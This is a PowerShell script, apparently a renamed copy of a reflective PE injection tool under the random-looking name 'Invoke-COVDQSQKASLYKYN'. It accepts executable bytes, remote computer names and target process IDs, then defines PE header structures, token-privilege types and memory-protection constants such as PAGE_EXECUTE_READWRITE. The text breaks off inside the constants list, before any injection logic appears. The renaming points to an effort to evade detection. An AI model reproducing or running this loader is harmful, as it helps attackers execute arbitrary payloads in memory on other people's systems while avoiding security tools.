function Invoke-COVDQSQKASLYKYN
{

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,

	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',

	[Parameter(Position = 3)]
	[String]
	$ExeArgs,

	[Parameter(Position = 4)]
	[Int32]
	$ProcId,

	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)

	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType


		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType


		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType


		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType



		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
